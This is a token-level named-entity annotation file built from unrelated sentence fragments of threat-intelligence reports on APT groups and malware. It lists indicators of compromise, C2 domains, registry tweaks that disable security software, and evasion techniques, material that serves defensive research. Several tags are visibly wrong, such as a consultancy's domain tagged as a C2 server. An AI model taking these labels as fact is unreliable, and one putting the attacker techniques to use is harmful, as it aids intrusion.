AlienSpy B-malware.backdoor
famous O
Android O
Remote O
Access O
Tools O
( O
RATs O
) O
. O

HTTP/1.0 O
200 O
Server O
: O
Apache/2.2.3 O
( O
Red O
Hat O
) O
Accept-Ranges O
: O
bytes O
Content-Type O
: O
text/html O
Proxy-Connection O
: O
keep-alive O

In O
addition O
, O
some O
variants O
copy O
the O
file O
name O
and O
use O
it O
as O
the O
decoy O
document B-malware.backdoor
file O
name O
. O

The O
Islamic O
Republic O
has O
historically O
preferred O
to O
use O
proxies O
or O
front O
organizations O
both O
in O
physical O
conflict O
— O
Hezbollah O
against O
Israel O
and O
Yemen O
rebels O
against O
Saudi O
Arabia O
— O
and O
cyberattacks O
to O
achieve O
their O
policy O
goals O
. O

What O
makes O
the O
server O
variant O
interesting O
is O
the O
device O
driver O
that O
the O
variant O
installs O
. O

Spearphishing O
emails O
and O
malware O
sent O
to O
the O
family O
and O
their O
associates O
during O
this O
period O
may O
have O
been O
intended O
to O
help O
track O
Alma O
and O
Alua O
's O
movements O
in O
preparation O
for O
this O
incident O
. O

The O
Retro B-malware.backdoor
backdoor O
is O
an O
evolution O
of O
the O
Lucker B-malware.backdoor
backdoor O
and O
it O
actives O
in O
a O
series O
of O
attacks O
from O
2016 O
till O
now O
. O

0x10 O
0x12 O
0x19 O
0x1A O
0x1B O
드라이브 O
정보 O
파일 O
검색 O
인터넷에서 O
데이터 O
받아 O
파일 O
생성 O
일정 O
시간 O
후 O
메인 O
기능 O
재실행 O
nehomegpa.dll O
파일 O
옮김 O
프로세스 O
리스트 O
얻기 O
프로세스 O
종료 O
권한 O
상승 O
[ O
표 O
4 O
] O
Phandoor B-malware.backdoor
주요 O
명령 O
Andaratm B-malware.backdoor
악성코드는 O
2016년 O
군사 O
기관 O
공격 O
, O
2017년 O
ATM O
• O
금융사 O
공격 O
, O
2018년 O
가상 O
화폐 O
거래소 O
공격에 O
사용되었다 O
. O

The O
server O
variant O
then O
attempts O
to O
determine O
if O
it O
has O
suitable O
access O
rights O
within O
the O
system O
in O
order O
to O
operation O
. O

Buffer.BlockCopy O
( O
Resource1._1 O
, O
54 O
, O
array O
, O
0 O
, O
30720 O
) O
; O
for O
( O
int O
i O
= O
0 O
; O
i O
< O
array.Length O
; O
i++ O
) O
byte O
b O
= O
56 O
; O
array O
[ O
i O
] O
^= O
b O
; O

Function O
DecryptCommandBuffer_sub_44C628 O
( O
) O

We O
expect O
that O
APT12 O
will O
continue O
their O
trend O
and O
evolve O
and O
change O
its O
tactics O
to O
stay O
ahead O
of O
network O
defenders O
. O

She O
also O
sent O
him O
a O
screenshot O
to O
show O
what O
Tweety B-malware.backdoor
Chat I-malware.backdoor
looked O
like O
. O

The O
Network O
Security O
protection O
of O
IPS O
and O
NGFW O
have O
up-to-date O
signatures O
to O
detect O
malicious O
network O
activity O
by O
threat O
actors O
. O

[ O
RC4 O
key O
( O
4 O
bytes O
) O
] O
[ O
encrypted O
data O
] O

It O
can O
be O
extremely O
time-consuming O
just O
going O
through O
the O
dump O
of O
functions O
that O
have O
no O
meaning O
at O
all O
in O
the O
code O
– O
and O
this O
is O
only O
one O
of O
the O
more O
simplistic O
tactics O
this O
malware O
is O
using O
. O

In O
the O
example O
, O
link O
analysis O
is O
provided O
by O
PalantirTM O
. O

All O
rights O
reserved O
. O

To O
reduce O
false O
positives O
, O
tighten O
the O
Snort O
IDS O
signature O
to O
focus O
on O
China B-malware.backdoor
Chopper I-malware.backdoor
by O
looking O
for O
contents O
of O
' O
FromBase64String O
' O
and O
' O
z1 O
' O
as O
follows O
: O

Analysis O
determined O
the O
command O
format O
was O
: O
drive O
identification O
followed O
by O
one O
or O
more O
command O
and O
parameter O
strings O
. O

There O
is O
not O
signifi O
cant O
evidence O
to O
attribute O
the O
operation O
directly O
to O
the O
Chinese O
Government O
. O

Supported O
commands O
and O
their O
respective O
codes O

This O
operation O
made O
little O
sense O
in O
comparison O
to O
the O
other O
more O
complicated O
reordering O
and O
longer O
XOR O
encodings O
used O
prior O
to O
this O
mechanism O
. O

In O
addition O
, O
they O
also O
used O
similar O
anonymization O
services O
for O
their O
domains O
repeatedly O
. O

' O
SC O
' O
command O
used O
to O
create O
the O
target O
service O
, O
and O
parsed O
by O
' O
ProcessScCommand O
' O
routine O
The O
installed O
service O
registry O
key O
is O
opened O
and O
the O
2 O
values O
under O
its O
Parameter O
subkey O
are O
created O
. O

The O
core O
of O
the O
FireEye O
platform O
is O
a O
virtual O
execution O
engine O
, O
complemented O
by O
dynamic O
threat O
intelligence O
, O
to O
identify O
and O
block O
cyber O
attacks O
in O
real O
time O
. O

Projects O
: O

The O
review O
of O
network O
perimeter O
netflow O
or O
firewall O
logs O
will O
assist O
in O
determining O
whether O
your O
network O
has O
experienced O
suspicious O
activity O
. O

Consequently O
, O
offline O
analysis O
is O
possible O
, O
although O
more O
laborious O
than O
online O
analysis O
, O
whereby O
the O
analyst O
may O
either O
instrument O
a O
mock O
victim O
or O
create O
a O
man-in-the-middle O
service O
, O
then O
attempt O
to O
be O
exploited O
by O
the O
attacker O
. O

There O
are O
minor O
differences O
between O
the O
ZxShell B-malware.backdoor
implementation O
of O
this O
command O
and O
the O
original O
Windows O
one O
, O
but O
they O
are O
irrelevant O
for O
the O
purpose O
of O
the O
analysis O
The O
command O
used O
to O
install O
the O
service O
is O
: O

E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F B-hash
was O
' O
unknown O
' O
to O
AMP O
on O
2014-05-06 O
, O
but O
detected O
as O
malicious O
the O
next O
time O
it O
was O
seen O
on O
a O
customer O
's O
machine O
on O
2014-05-07 O
. O

In O
order O
to O
infect O
the O
victims O
, O
the O
attackers O
distributed O
spear-phishing O
emails O
containing O
malicious O
word O
document O
which O
dropped O
a O
malware O
capable O
of O
spying O
on O
infected O
systems O
. O

In O
addition O
, O
the O
attacker O
used O
the O
following O
tools O
: O
CredRaptor O
( O
password O
stealer O
) O
Plainpwd O
( O
modified O
Mimikatz O
used O
for O
recovering O
Windows O
credentials O
from O
memory O
) O
SysInternals O
' O
PsExec O
( O
used O
for O
lateral O
movement O
) O
As O
mentioned O
above O
, O
in O
the O
final O
stage O
of O
their O
attacks O
, O
the O
TeleBots O
attackers O
pushed O
ransomware O
using O
stolen O
Windows O
credentials O
and O
SysInternals O
' O
PsExec O
. O

In O
addition O
to O
the O
icon.swf O
HT O
0day O
( O
214709aa7c5e4e8b60759a175737bb2b O
) O
, O
it O
looks O
as O
though O
the O
' O
tisone360.com O
' O
site O
was O
delivering O
a O
Flash O
CVE-2014-0497 O
exploit O
in O
April O
. O

FireEye O
identified O
overlaps O
between O
the O
domain O
registration O
details O
of O
CyberCaliphate B-malware.infosteal
's O
website O
and O
APT28 B-malware.infosteal
infrastructure O
. O

This O
, O
in O
conjunction O
with O
the O
nature O
of O
the O
related O
files O
we O
have O
discovered O
( O
all O
of O
them O
are O
directly O
executable O
files O
) O
means O
it O
is O
likely O
that O
the O
malware O
is O
primarily O
delivered O
via O
spear O
phishing O
attempts O
, O
rather O
than O
any O
other O
method O
. O

Every O
binary O
created O
using O
the O
Microsoft O
Visual O
Studio O
toolchain O
has O
a O
special O
header O
that O
contains O
information O
about O
the O
number O
of O
input O
object O
files O
and O
version O
information O
of O
the O
compilers O
used O
to O
create O
them O
, O
the O
' O
Rich O
' O
header O
called O
so O
by O
the O
magic O
string O
that O
is O
used O
to O
identify O
it O
in O
the O
file O
. O

Name O
of O
signer O
: O
Signing O
time O
: O
Certificate O
serial O
# O
: O
63 O
6c O
75 O
43 O
dd O
bd O
f9 O
69 O
f4 O
73 O
16 O
0f O
4b O
09 O
9b O
9e O
Cisco O
Systems O
, O
Inc O
. O

Second O
stage O
payloads O

Therefore O
, O
in O
most O
cases O
a O
vigilant O
target O
should O
be O
able O
to O
notice O
the O
attack O
and O
avoid O
infection O
. O

APT32 B-malware.infosteal
often O
deploys O
these O
backdoors O
along O
with O
the O
commercially-available O
Cobalt O
Strike O
BEACON O
backdoor O
. O

This O
is O
unfortunately O
not O
available O
for O
analysis O
currently O
. O

SHA1 O
Compile O
time O
Size O
( O
bytes O
) O
Filename O
525a8e3ae4e3df8c9c61f2a49e38541d196e9228 O
2016-02-05 O
11:46:20 O
65,536 O
evtdiag.exe B-malware.drop
76bab478dcc70f979ce62cd306e9ba50ee84e37e O
2016-02-04 O
13:45:39 O
16,384 O
evtsys.exe B-malware.drop
70bf16597e375ad691f2c1efa194dbe7f60e4eeb O
2016-02-05 O
08:55:19 O
24,576 O
nroff_b.exe B-malware.drop
6207b92842b28a438330a2bf0ee8dcab7ef0a163 O
N/A O
33,848 O
gpca.dat B-malware.unknown
We O
believe O
all O
files O
were O
created O
by O
the O
same O
actor O
( O
s O
) O
, O
but O
the O
main O
focus O
of O
the O
report O
will O
be O
on O

Not O
all O
of O
the O
plugins O
are O
downloaded O
to O
every O
target O
. O

In O
other O
situations O
, O
the O
initial O
sample O
may O
not O
even O
be O
 agged O
as O
malicious O
due O
to O
evasion O
techniques O
being O
utilized O
. O

Encryption O
of O
code O
and O
configurations O
using O
cipher O
algorithms O
such O
as O
the O
Advanced O
Encryption O
Standard O
( O
AES O
) O
, O
RSA O
, O
and O
Rivest O
Cipher O
4 O
( O
RC4 O
) O
enabled O
them O
to O
evade O
detection O
and O
prolong O
analysis O
. O

The O
malware O
after O
execution O
keeps O
track O
of O
the O
user O
activity O
( O
like O
applications O
opened O
, O
files O
opened O
etc O
) O
but O
does O
not O
immediately O
generate O
any O
network O
traffic O
, O
this O
is O
to O
make O
sure O
that O
no O
network O
activity O
is O
generated O
during O
automated/sandbox O
analysis O
. O

The O
ZxShell B-malware.backdoor
mutex O
is O
created O
named O
@ B-malware.backdoor
_ I-malware.backdoor
ZXSHELL I-malware.backdoor
_ O
@ O
. O

F O
: O
\Projects\g3\G3 O
Version O
4.0\G3\G3\obj\Release\Intel O
Core.pdb O

The O
malicious O
code O
checks O
permissions O
and O
asks O
for O
additional O
permissions O
if O
it O
does O
not O
already O
have O
them O
: O
Permission O
to O
access O
the O
user O
's O
contact O
list O
( O
PhnNumber O
: O
:getContAccess O
) O
Permission O
to O
access O
the O
user O
's O
photos O
( O
PhnNumber O
: O
:getPAccess O
) O
Permission O
to O
access O
the O
user O
's O
photos O
( O
PhnNumber O
: O
:getPAccess O
) O
One O
of O
the O
most O
relevant O
features O
of O
these O
compromised O
versions O
of O
the O
applications O
is O
the O
Telegram O
and O
WhatsApp O
message O
stealing O
feature O
. O

Casting O
a O
wider O
net O
After O
compromising O
indiscriminate O
targets O
, O
attackers O
may O
dig O
deeper O
into O
specific O
targets O
of O
interest O
and/or O
sell O
off O
the O
access O
rights O
of O
the O
victims O
' O
systems O
and O
their O
data O
to O
others O
. O

www.accenture.com B-url.cncsvr

Confucius O
targeted O
a O
particular O
set O
of O
individuals O
in O
South O
Asian O
countries O
, O
such O
as O
military O
personnel O
and O
businessmen O
, O
among O
others O
. O

This O
map O
offers O
a O
simplifi O
ed O
view O
of O
the O
location O
and O
nature O
of O
the O
targets O
. O

AgentKernel O
Keylogger O
Coder O
Cryptor O
State-sponsored O
threat O
actors O
go O
to O
great O
lengths O
to O
reach O
their O
goals O
. O

Otherwise O
, O
ZxShell B-malware.backdoor
tries O
to O
connect O
to O
the O
first O
item O
of O
the O
list O
. O

An O
Engineering O
Workstation O
is O
a O
computer O
used O
for O
configuration O
, O
maintenance O
and O
diagnostics O
of O
the O
control O
system O
applications O
and O
other O
control O
system O
equipment O
. O

Figure O
24 O
: O
Keylogger O
Function O

The O
Central O
Bureau O
of O
Investigation O
( O
CBI O
) O
is O
the O
domestic O
intelligence O
and O
security O
service O
of O
India O
and O
serves O
as O
the O
India O
's O
premier O
investigative O
and O
Interpol O
agency O
operating O
under O
the O
jurisdiction O
of O
the O
Government O
of O
India O
. O

Western O
businesses O
should O
closely O
monitor O
geopolitical O
events O
initiated O
by O
the O
United O
States O
or O
Europe O
that O
affect O
Iran O
. O

Figure O
3 O
: O

Recent O
reporting O
regarding O
North O
Korean O
attacks O
against O
cryptocurrency O
exchanges O
and O
using O
Pyeongchang O
Olympics O
as O
a O
lure O
describe O
techniques O
that O
are O
unusual O
for O
the O
Lazarus O
Group O
. O

CrowdStrike O
Services O
Inc. O
, O
our O
Incident O
Response O
group O
, O
was O
called O
by O
the O
Democratic O
National O
Committee O
( O
DNC O
) O
, O
the O
formal O
governing O
body O
for O
the O
US O
Democratic O
Party O
, O
to O
respond O
to O
a O
suspected O
breach O
. O

For O
example O
Casper B-malware.unknown
used O
an O
' O
ID O
' O
value O
set O
to O
' O
13001 O
' O
, O
whereas O
some O
Babar B-malware.unknown
samples O
used O
' O
12075­01 O
' O
and O
' O
11162­01 O
' O
. O

We O
were O
able O
to O
discover O
four O
distinct O
versions O
of O
GravityRAT B-malware.drop
, O
developed O
over O
two O
years O
. O

Many O
of O
the O
victims O
have O
joint O
ventures O
or O
partner O
operations O
in O
Brazil O
. O

Collaboration O
with O
information­sharing O
partners O
and O
victim O
institutions O
allowed O
us O
to O
become O
aware O
of O
the O
more O
complicated O
business O
cycle O
involved O
in O
this O
story O
, O
greatly O
adding O
to O
our O
research O
interest O
in O
tracking O
these O
campaigns O
. O

The O
only O
documented O
case O
is O
the O
Benny O
Gantz-themed O
email O
which O
triggered O
the O
investigation O
. O

< O
div O
id='silverlightControlHost O
' O
> O
< O
object O
data='data O
: O
application/x-silverlight O
, O
' O
type='application/x-silverlight-2 O
' O
width='100 O
% O
' O
height='100 O
% O
' O
> O
< O
param O
name='source O
' O
value='ClientBin/MisaporPortalUI.xap?ver=1.0.7.0'/ O
> O
< O
param O
name='onerror O
' O
value='onSilverlightError O
' O
/ O
> O
< O
param O
name='background O
' O
value='white O
' O
/ O
> O
< O
param O
name='minRuntimeVersion O
' O
value='3.0.40624.0 O
' O
/ O
> O
< O
param O
name='autoUpgrade O
' O
value='true O
' O
/ O
> O
< O
a O
href='/web/20170203175640/ B-url.unknown
http://go.microsoft.com/fwlink/ I-url.unknown
? O

Epic/Tavdig B-malware.backdoor
backdoors O
: O

The O
download O
server O
also O
contains O
a O
Remote O
Access O
Trojan O
developed O
in O
Python O
( O
both O
client O
and O
server O
) O
. O

The O
XOR O
keys O
used O
are O
0x39 O
and O
0x71 O
. O

The O
archive O
contains O
an O
.exe O
file O
, O
sometimes O
disguised O
as O
a O
Microsoft O
Word O
file O
, O
a O
video O
, O
or O
another O
file O
format O
, O
using O
the O
corresponding O
icon O
. O

The O
Shamoon B-malware.unknown
sample O
Fidelis O
researchers O
had O
available O
looked O
very O
similar O
to O
that O
detailed O
in O
community O
write-ups O
. O

This O
approach O
is O
rather O
inherent O
to O
many O
amateur O
virus-writers O
and O
these O
malware O
attacks O
are O
mostly O
ignored O
. O

A5bddb5b10d673cbfe9b16a062ac78c9aa75b61c B-hash

da02193fc7f2a628770382d9b39fe8e0 B-hash
3d0d71fdedfd8945d78b64cdf0fb11ed B-hash
63069c9bcc4f8e16412ea1a25f3edf14 B-hash
8152e241b3f1fdb85d21bfcf2aa8ab1d B-hash

NALYSIS O
ON O
MODULE O
2 O
............................................................................................................................................. O
5 O

Command-and-Control O

When O
ANEL B-malware.backdoor
executes O
, O
a O
decrypted O
DLL O
file O
with O
the O
filename O
' O
lena_http_dll.dll O
' O
is O
expanded O
in O
memory O
. O

Dropped O
Malware O
Samples O
: O

In O
reality O
, O
running O
the O
.LNK B-malware.drop
file O
executes O
the O
malware O
. O

취약점 O
공격에 O
성공하면 O
웹브라우저로 O
접속한 O
시스템에 O
자바 O
스크립트나 O
VB O
스크립트 O
파일이 O
생성되며 O
, O
이를 O
통해 O
특정 O
주소에서 O
악성코드를 O
다운로드한다 O
. O

Consider O
restricting O
access O
to O
sensitive O
password O
hashes O
by O
using O
a O
shadow O
password O
file O
or O
equivalent O
on O
UNIX O
systems O
. O

On O
the O
k O
th O
iteration O
, O
one O
of O
the O
swapped O
elements O
is O
always O
the O
k O
th O
element O
, O
which O
is O
pointed O
to O
by O
register O
ECX O
; O
the O
other O
is O
chosen O
based O
on O
the O
key O
string O
. O

Whereas O
previously O
it O
relied O
on O
one O
service O
provider O
( O
CloudMe.com O
) O
, O
more O
recently O
it O
has O
employed O
a O
least O
 ve O
cloud O
service O
providers O
Leveraging O
the O
cloud O
for O
C O
& O
C O
has O
a O
number O
of O
advantages O
for O
groups O
like O
Inception B-malware.backdoor
. O

The O
Carbanak B-malware.infosteal
team O
does O
not O
just O
blindly O
compromise O
large O
numbers O
of O
computers O
and O
try O
to O
' O
milk O
the O
cow O
' O
as O
other O
actors O
do O
, O
instead O
they O
act O
like O
a O
mature O
APT-group O
. O

Ultimately O
, O
these O
emergent O
economies O
are O
likely O
seeking O
to O
hasten O
their O
path O
to O
success O
in O
fulfilling O
national O
objectives O
via O
the O
' O
short-cut O
' O
that O
cyber O
espionage O
offers O
. O

After O
further O
researching O
the O
associated O
infrastructure O
of O
the O
C2 O
( O
Figure O
13 O
) O
, O
we O
were O
able O
to O
find O
potential O
number O
of O
victims O
for O
this O
particular O
campaign O
. O

Then O
it O
transmits O
by O
making O
use O
of O
both O
RSA O
and O
BASE64 O
encryption O
. O

Figure O
1 O
: O
SSH O
tool O
disguise O
Figure O
2 O
Create O
dummy O
certificate O
files O

154261a4aab73f1ceef28695d8837902cc1e8b5cca0b8fc81ddeda350564adc0 B-hash
- O
MSOffice/CVE_2017_11882.A!tr O
05dcc7856661244d082daa88a074d2f266c70623789a7bb5a919282b178d8f98 B-hash
- O
W32/Sarhust.D!tr O
hxxp://157.52.167.71:29317/office/word/2003/ph2/philip.varilla B-url.unknown
hxxp://publicdfaph.publicvm.com:8080/ B-url.cncsvr

HKLMSOFTWAREAhnLabV3 O
365 O
ClinicInternetSec O
UseFw O
= O
0 O
UseIps O
= O
0 O

Then O
, O
it O
reads O
user-related O
info O
from O
the O
file O
sqlxmlx.inc O
in O
the O
same O
folder O
( O
we O
can O
see O
strings O
referencing O
to O
' O
UserID O
' O
commentary O
in O
this O
part O
of O
the O
code O
) O
. O

As O
we O
stated O
earlier O
, O
some O
of O
the O
features O
of O
the O
original O
ScanBox B-malware.infosteal
code O
were O
probably O
designed O
to O
help O
those O
analysing O
results O
distinguish O
between O
honeypots/analysis O
environments O
and O
real-world O
victims O
. O

At O
least O
35 O
victim O
companies O
have O
been O
identified O
with O
primary O
targets O
including O
financial O
and O
government O
institutions O
, O
telecommunications O
, O
manufacturing O
, O
energy O
and O
other O
service O
utility O
companies O
, O
as O
well O
as O
media O
and O
public O
relations O
firms O
. O

In O
our O
Predictions O
Report O
we O
discuss O
how O
our O
conne O
... O
https://t.co/4ZQSgDurWwmcafee_labs O
In O
a O
recent O
campaign O
, O
the O
Sun O
Team O
hacking O
group O
implanted O
cryptocurrency-lending O
platform O
Falcon O
Coin O
, O
but O
the O
similarly O
named O
domain O
is O
not O
associated O
with O
the O
legitimate O
entity O
. O

page O
| O
13 O

The O
indicators O
associated O
with O
this O
attack O
are O
provided O
so O
that O
the O
organizations O
( O
Government O
, O
Public O
, O
Private O
organizations O
and O
Defense O
sectors O
) O
can O
use O
these O
indicators O
to O
detect O
, O
remediate O
and O
investigate O
this O
attack O
campaign O
. O

The O
dropper O
part O
has O
the O
following O
flow O
of O
execution O
: O

In O
fact O
, O
the O
file O
Outllib.dll O
is O
actually O
the O
Hussarini B-malware.backdoor
backdoor O
, O
a O
DLL O
which O
exports O
functions O
containing O
the O
malicious O
code O
. O

Using O
this O
vulnerability O
, O
the O
exploit O
implements O
a O
series O
of O
writes O
at O
specified O
addresses O
to O
achieve O
full O
remote O
code O
execution O
. O

This O
file O
was O
a O
self-extracting O
( O
SFX B-malware.drop
) O
archive O
that O
, O
when O
executed O
, O
presents O
the O
target O
victim O
with O
a O
12 O
page O
decoy O
PDF O
document O
. O

The O
Matryoshka B-malware.unknown
infection O
framework O
is O
built O
of O
three O
parts O
: O

Figure O
3 O
: O
HIGHTIDE B-malware.backdoor
GET O
Request O
Example O

1 O
. O

Each O
packet O
that O
arrives O
within O
the O
packet O
queue O
of O
contains O
a O
standard O
header O
followed O
by O
a O
( O
quasi-optional O
) O
payload O
data O
blob O
. O

Figure O
8 O
demonstrates O
that O
some O
of O
the O
characters O
in O
the O
window O
are O
not O
in O
English O
and O
are O
not O
displayed O
properly O
on O
the O
form O
. O

The O
VMWare O
check O
looks O
for O
the O
registry O
HKLM\SOFTWARE\VMware O
, O
Inc.\VMware O
Tools O
and O
the O
files O
% O
WINDIR%\system32\drivers\vmmouse.sys O
and O
% O
WINDIR%\system32\drivers\vmhgfs.sys O
. O

Encoding O
the O
encryption O
key O
In O
order O
for O
the O
C O
& O
C O
server O
to O
decrypt O
the O
encrypted O
data O
, O
the O
randomly O
generated O
AES256 O
key O
must O
be O
included O
in O
the O
packet O
along O
with O
the O
encrypted O
data O
. O

else O

C O
& O
C O
: O

Each O
attempt O
may O
either O
succeed O
or O
fail O
, O
but O
the O
overall O
goal O
is O
to O
penetrate O
the O
target O
's O
network O
and O
acquire O
information O
. O

35 O
. O

Getting O
object O
by O
index O
from O
constant O
pool O
without O
any O
checks O

From O
the O
data O
we O
have O
at O
our O
disposal O
, O
we O
can O
say O
with O
a O
fair O
degree O
of O
certainty O
that O
the O
' O
Tilded O
' O
platform O
was O
created O
around O
the O
end O
of O
2007 O
or O
early O
2008 O
before O
undergoing O
its O
most O
significant O
changes O
in O
summer/autumn O
2010 O
. O

Below O
are O
keywords O
that O
have O
been O
used O
in O
the O
recent O
campaigns O
: O

The O
plugin O
registry O
key O

microsoftservices.proxydns.com B-url.unknown
- O
current O
rampage.freetcp.com B-url.unknown
- O
current O
fighthard.mooo.com B-url.unknown
- O
9/8/2014 O
www.micro.zyns.com B-url.unknown
- O
current O
computer001.dumb1.com B-url.unknown
- O
current O
microlab.dns04.com B-url.unknown
- O
current O
word.crabdance.com B-url.unknown
- O
11/12/2012 O
fighhard.mooo.com B-url.unknown
- O
1/31/2014 O
queenberry.www1.biz B-url.unknown
- O
2/14/2014 O
fighthard.mooo.com B-url.unknown
- O
5/20/2014 O
queenberry.www1.biz B-url.unknown
- O
10/1/2014 O
anhtuan88.ns01.biz B-url.unknown
anhphuong85.www1.biz B-url.unknown
word.crabdance.com B-url.unknown
- O
9/8/2012 O
www.fornobody.dns04.com B-url.unknown
ftp.fornobody.dns04.com B-url.unknown
fornobody.dns04.com B-url.unknown
fornobody.dns04.com B-url.unknown
- O
9/2/2011 O
www.qwertyui.dns04.com B-url.unknown
- O
2/24/2012 O
www.qwertyui.dns04.com B-url.unknown
- O
3/3/2012 O
beyondbuck.dns1.us B-url.unknown
letitsnowsmart.instanthq.com B-url.unknown
prime98.jumpingcrab.com B-url.unknown
fuck.ruouvangnhatrang.com B-url.unknown
www.micro1.zyns.com B-url.unknown
www.micro.zyns.com B-url.unknown
www.micro1.zyns.com B-url.unknown
www.qwertyui.dns04.com B-url.unknown
- O
3/2/2011 O
www.ollay011.zyns.com B-url.unknown
- O
3/4/2011 O
www.olay033.dns04.com B-url.unknown
- O
3/12/2011 O
www.olay044.dns04.com B-url.unknown
- O
4/30/2011 O
9999992009.rr.nu B-url.unknown
9999992011.rr.nu B-url.unknown
9999992009.myfw.us B-url.unknown
www.qwertyui.dns04.com B-url.unknown
- O
3/4/2012 O
microlab.mrslove.com B-url.unknown

We O
assume O
that O
the O
author O
implemented O
this O
feature O
because O
several O
targets O
switched O
to O
this O
version O
of O
Windows O
in O
2008 O
. O

The O
key O
is O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows O
: O
The O
malware O
repeatedly O
checks O
whether O
this O
entry O
is O
removed O
. O

And O
now O
to O
tie O
all O
this O
back O
to O
the O
' O
well-known O
' O
threat O
group O
. O

Mobile O

The O
developers O
also O
added O
additional O
language O
support O
to O
the O
library O
: O
German O
Spanish O
French O
Italian O
Chinese O
The O
author O
changed O
the O
backend O
of O
the O
C2 O
server O
with O
this O
variant O
. O

According O
to O
McAfee O
, O
one O
of O
the O
major O
tools O
, O
techniques O
, O
and O
procedures O
( O
TTPs O
) O
used O
by O
this O
threat O
actor O
was O
their O
use O
of O
obfuscated O
or O
encrypted O
HTML O
comments O
embedded O
in O
otherwise O
benign O
websites O
, O
in O
order O
to O
indirectly O
control O
compromised O
endpoints O
. O

These O
paths O
are O
used O
by O
various O
Symantec O
products O
. O

Also O
, O
ZhuDongFangYu.exe O
, O
360tray.exe O
and O
360sd.exe O
process O
names O
are O
used O
by O
security O
products O
that O
originate O
from O
China O
. O

Analysis O
of O
this O
malware O
continues O
to O
suggest O
that O
a O
sophisticated O
effort O
was O
behind O
its O
creation O
and O
employment O
. O

CozyDuke B-malware.drop
will O
modify O
the O
registry O
entries O
in O
such O
a O
way O
that O
any O
loading O
of O
the O
SharedTaskScheduler O
COM O
object O
will O
first O
load O
a O
special O
CozyDuke B-malware.drop
module O
that O
will O
ensure O
CozyDuke B-malware.drop
stays O
active O
on O
the O
victim O
host O
. O

ACTIONABLE O
INTELLIGENCE O

Once O
its O
initialization O
is O
done O
, O
the O
following O
registry O
key O
is O
created O
to O
instruct O
the O
backdoor O
to O
use O
HTTP O
in O
future O
communication O
with O
the O
C O
& O
C O
server O
: O
HKCU\SOFTWARE\Classes\ O
CLSID O
{ O
E3517E26-8E93-458D-A6DF-8030BC80528B O
} O
. O

FireEye O
assesses O
that O
APT32 B-malware.infosteal
leverages O
a O
unique O
suite O
of O
fully-featured O
malware O
, O
in O
conjunction O
with O
commercially-available O
tools O
, O
to O
conduct O
targeted O
operations O
that O
are O
aligned O
with O
Vietnamese O
state O
interests O
. O

These O
IP O
addresses O
can O
be O
considered O
examples O
– O
they O
change O
regularly O
. O

In O
both O
cases O
generation O
is O
based O
on O
the O
MAC-address O
and O
computer O
name O
and O
the O
resulting O
value O
is O
formatted O
using O
the O
wsprintf O
–function O
. O

If O
the O
communication O
fails O
, O
ZxShell B-malware.backdoor
disables O
the O
firewall O
by O
modifying O
the O
registry O
key O
: O

Spam O
Activity O

Samples O
in O
yellow O
connecting O
to O
C O
& O
C O
hosts O
( O
green O
) O
. O

With O
this O
blog O
series O
, O
we O
want O
to O
discuss O
some O
of O
the O
simple O
techniques O
and O
tactics O
we O
've O
used O
to O
break O
down O
the O
features O
of O
DUBNIUM B-malware.drop
. O

After O
that O
, O
the O
count O
for O
each O
port O
starts O
declining O
sharply O
. O

The O
group O
tends O
to O
attack O
different O
companies O
with O
a O
strong O
focus O
on O
the O
energy O
and O
industrial O
sectors O
. O

After O
using O
the O
one-based O
index O
EBX O
to O
pull O
out O
the O
first O
of O
the O
two O
source O
bytes O
in O
the O
pair O
, O
it O
adds O

When O
a O
potential O
victim O
visits O
the O
link O
, O
they O
are O
offered O
the O
download O
of O
a O
file O
which O
MediaFire O
lists O
as O
uploaded O
on O
June O
15 O
, O
2013 O
. O

The O
TCIRT O
believes O
that O
a O
possible O
theory O
that O
supports O
an O
Indian O
attack O
scenario O
is O
that O
the O
Telenor O
subsidiary O
, O
Telenor O
Pakistan O
, O
is O
a O
strategic O
communications O
infrastructure O
provider O
. O

Payloads O
are O
detected O
with O
HEUR:Trojan.Win32.ScarCruft.gen B-malware.infosteal
verdict O
. O

Copyright O
© O
2013 O
Symantec O
Corporation O
. O

The O
malicious O
macro O
code O
was O
reverse O
engineered O
to O
understand O
its O
capabilities O
. O

This O
dropper O
will O
then O
proceed O
to O
write O
to O
disk O
the O
main O
CozyDuke B-malware.drop
components O
as O
well O
as O
an O
encrypted O
configuration O
file O
used O
by O
CozyDuke B-malware.drop
. O

Contact O
DHS O
or O
law O
enforcement O
immediately O
. O

They O
tested O
the O
detection O
on O
macros O
( O
by O
modifying O
them O
, O
or O
by O
executing O
the O
calc O
instead O
of O
the O
malicious O
payload O
) O
and O
the O
developers O
tried O
dynamic O
data O
exchange O
( O
DDE O
) O
execution O
in O
the O
Office O
document O
. O

In O
all O
our O
cases O
, O
it O
is O
set O
to O
either O
' O
SN0 O
' O
or O
' O
SN1 O
. O
' O

They O
have O
also O
engaged O
in O
aggressive O
information O
operations O
in O
the O
media O
. O

Example O
zip O
files O
: O
ئلإا O
ب O
روعرع O
لا O
نا O
ندع O
خي O
ش O
لا O
يأر O
.zip O

For O
more O
technical O
information O
on O
file O
systems O
and O
their O
forensic O
value O
, O
Brian O
Carrier O
's O
book O
File O
System O
Forensic O
Analysis O
is O
an O
invaluable O
tool O
. O

Because O
all O
of O
the O
code O
is O
server-side O
language O
that O
does O
not O
generate O
client-side O
code O
, O
browsing O
to O
the O
Web B-malware.ransom
shell O
and O
viewing O
the O
source O
as O
a O
client O
reveals O
nothing O
. O

Before O
the O
service O
is O
started O
ChangeServiceConfig O
is O
called O
to O
modify O
the O
service O
type O
to O
shared O
and O
interactive O
. O

5cb6e6e0fbe87eba975b5ae0efaf2ca4 B-hash
Center14430654.dat O
/ O
anyconnect-win-4.1.04011-web-deploy-k9.exe O
4f4bf27b738ff8f2a89d1bc487b054a8 B-hash
Center111940519.dat O
75d3d1f23628122a64a2f1b7ef33f5cf B-hash
adobe.dat O
d9821468315ccd3b9ea03161566ef18e B-hash
' O
unknown O
' O
b9af5f5fd434a65d7aa1b55f5441c90a B-hash
adobe.dat O

Despite O
the O
shell O
being O
written O
in O
PHP O
and O
only O
displaying O
a O
simple O
Login O
prompt O
, O
it O
is O
easy O
to O
identify O
the O
Angel O
webshell O
based O
on O
unique O
components O
of O
its O
viewable O
HTML O
source O
code O
. O

It O
's O
possible O
that O
Lazarus O
is O
using O
tools O
other O
than O
RATANKBA B-malware.backdoor
to O
target O
larger O
organizations O
. O

McAfee O
Vulnerability O
The O
FSL/MVM O
package O
of O
January O
15 O
includes O
a O
vulnerability O
check O
